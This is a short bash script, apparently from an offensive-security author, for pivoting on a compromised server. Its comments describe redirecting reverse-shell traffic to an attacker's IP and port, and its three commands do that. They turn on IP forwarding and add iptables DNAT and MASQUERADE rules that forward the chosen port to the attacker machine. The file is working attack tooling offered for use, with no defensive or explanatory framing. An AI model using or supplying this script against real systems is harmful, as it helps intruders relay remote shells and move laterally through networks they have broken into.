#!/bin/bash
# @404death
# for redirect network traffic ( reverse shell ) pivoting
# route.sh run on compromised server .
# useage :  ./route.sh 10.10.10.7  443
# 443 = reverse shell port on attacker machine
# ip = attacker's ip

echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport $2 -j DNAT --to-destination $1:$2
iptables -t nat -A POSTROUTING -j MASQUERADE
